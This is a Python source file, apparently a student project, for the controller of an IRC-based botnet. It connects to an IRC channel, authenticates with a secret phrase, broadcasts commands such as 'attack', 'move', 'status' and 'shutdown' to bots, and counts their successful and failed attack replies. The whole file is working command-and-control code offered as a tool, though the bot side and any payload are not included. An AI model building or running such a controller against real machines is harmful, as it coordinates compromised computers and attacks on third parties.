import argparse
import sys
import select
import socket
import time
import random
from termios import tcflush, TCIFLUSH

class Controller_Client:
    def __init__(self, host, port, channel, secret_phrase):
        self.host = host
        self.port = port
        self.channel = "#" + channel
        self.secret_phrase = secret_phrase
        self.contr_counter = 1
        self.nick = "rbtnik_controller" + str(self.contr_counter)
        self.irc_socket = None
        self.attack_counter = 0
        self.identifier = "Have you ever danced with the devil in the pale moonlight?"

    def start_client(self):
        connected, self.irc_socket = self.__attempt_connection(5)
        if connected:
            self.send_to_channel(self.secret_phrase)
            text = self.get_text()
            if text != "":
                self.log(text)
            self.log("Please enter the command you wish to execute: ")
        while connected:
            # executes if there is input to be read in
            while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                command = sys.stdin.readline()
                if command:
                    command = command.strip()
                    self.__send_command(command)
                    tcflush(sys.stdin, TCIFLUSH) # flush the input buffer after executing
                    self.log("\nPlease enter the command you wish to execute: ")
                else: # an empty line means stdin has been closed
                    raise Exception("stdin has closed unexpectedly")
            # executes if there is no input to be read in
            else:
                text = self.get_text()
    
    # prompts the user to enter input in order to execute command
    #TODO delete if I don't end up needing it
    def __prompt_command(self):
        tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
        return input("Please enter the command you wish to execute: ").strip()

    #defines functionality for each channel
    def __send_command(self, command):
        if command == "quit":
            self.__terminate()
        else:
            self.send_to_channel(command)
        self.log("Waiting for responses...")
        time.sleep(5)
        response = self.get_text() # get response from bots
        # self.log("bot response: \n" + response)
        # self.log("done")

        # check if msg is a DM
        if not self.__handle_response(command, response):
            self.log("No Response")

    # receives and handles the response from the bots
    # returns True if command is recognizable, false otherwise
    def __handle_response(self, command, response):
        command = command.split()
        if len(command) <= 0:
            return False
        # parse the response into a dictionary
        response_dict = {}
        for line in response.strip().split('\n'):
            # ignore responses that are not private messages
            if ("PRIVMSG" in line) and (self.identifier in line) and (self.channel not in line):
                # get the sender's ID
                sender = line.split(':')[1].split(' ')[0].split('!')[0]
                # get the message sent by the sender
                message = line.split(' :')[1].strip(self.identifier).strip()
                response_dict[sender] = message
        if command[0] == "status":
            bot_list = []
            for bot in response_dict:
                bot_list.append(bot)
            self.log("Found " + str(len(bot_list)) + " bots: " + ", ".join(bot_list))
            return True

        if command[0] == "attack" or command[0] == "move":
            successful = 0
            unsuccessful = 0
            for bot in response_dict:
                self.log(bot + ": " + response_dict[bot])
                if "Successful" in response_dict[bot]:
                    successful += 1
                elif "Failed" in response_dict[bot]:
                    unsuccessful += 1
            self.log("Total: " + str(successful) + " successful, " + \
                     str(unsuccessful) + " unsuccessful")
            return True

        elif command[0] == "shutdown":
            total_sd = 0
            for bot in response_dict:
                self.log(bot + ": " + response_dict[bot])
                if response_dict[bot] == "Shutting Down...":
                    total_sd += 1
            self.log("Total: " + str(total_sd) + " bots shut down")
            return True
        else:
            return False

            
    # Closes connection and terminates controller
    def __terminate(self):
        self.log("Terminating...")
        self.send_to_channel("QUIT")
        self.irc_socket.close()
        sys.exit()

    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
    def get_text(self):
        text = self.recv_msg() #receive the text
        if text.find('PING') != -1:
            self.send_msg('PONG ' + text.split()[1] + '\r\n')
        return text
    
    # attempts connection with an input timeout in seconds
    def __attempt_connection(self, timeout):
        connected = False
        connected, conn_socket = self.__connect(timeout)
        if not connected:
            self.log("Error: Connection to Host: " + self.host + \
                     " on Port: " + str(self.port) + " failed.")
        return connected, conn_socket

    def __connect(self, timeout):
        conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_socket.settimeout(timeout)
        try:
            #TODO connect will stay hung up if the host is real
            conn_socket.connect((self.host, self.port))  # connect to server
        except socket.error as msg:
            return False, None
        conn_socket.settimeout(None)
        conn_socket.send(("USER "+ self.nick +" "+ self.nick +" "+ self.nick + \
        " :\n").encode()) # user authentication
        self.__establish_nick(conn_socket)
        conn_socket.send(("JOIN "+ self.channel +"\n").encode()) # join the channel
        return True, conn_socket

    # keeps sending nick messages until a valid nick is found
    def __establish_nick(self, conn_socket):
        valid_nick = False
        while not valid_nick:
            conn_socket.send(("NICK "+ self.nick+"\n").encode()) # sets nick
            response = conn_socket.recv(2040).decode()
            if "433" in response:
                # add random number onto end of nick
                self.contr_counter += random.randint(1,100)
                self.nick = "robotnik" + str(self.contr_counter)
            elif "001" in response:
                valid_nick = True

    # function for logging messages
    def log(self, message):
        print(message)#.strip("\n"))

    # functions to send/recv raw messages from IRC server
    def send_msg(self, message):
        sent = self.irc_socket.send(message.encode())

    def recv_msg(self):
        self.irc_socket.settimeout(0.5)
        try:
            data = self.irc_socket.recv(4096).decode()  #receive the text
        except socket.timeout:
            return ""
        return data

    # functions to send/recv messages to channel
    def send_to_channel(self, message):
        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")

    def send_to_user(self, nick, message):
        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")


# function to check if port is valid
def check_port(port):
    try:
        port = int(port)
    except ValueError:
        return False
    if port >= 0 and port <= 65535:
        return True
    else:
        return False

# argparse function to handle user input
# Reference: https://docs.python.org/3.6/howto/argparse.html
# define a string to hold the usage error msg
def parse_arguments():
    usage_string = ("conbot.py <host> <port> <channel> <secret-phrase>")
    parser = argparse.ArgumentParser(usage=usage_string)

    parser.add_argument("host",
                        help="Specifies the address of the server",
                        type=str)
    parser.add_argument("port",
                        help="Specifies the port on which the server is listening. "
                        "Port in integer range 0-65535",
                        type=int)
    parser.add_argument("channel",
                        help="IRC channel to join",
                        type=str)
    parser.add_argument("secret_phrase",
                        help="A secret text required to connect",
                        type=str)
    args = parser.parse_args()

    # check that port is in a valid range
    if not check_port(args.port):
        parser.exit("usage: " + usage_string)

    return args


def main():
    args = parse_arguments()
    # launch the client
    controller_client = Controller_Client(args.host, args.port, args.channel,
                                          args.secret_phrase)
    controller_client.start_client()
if __name__ == '__main__':
    main()
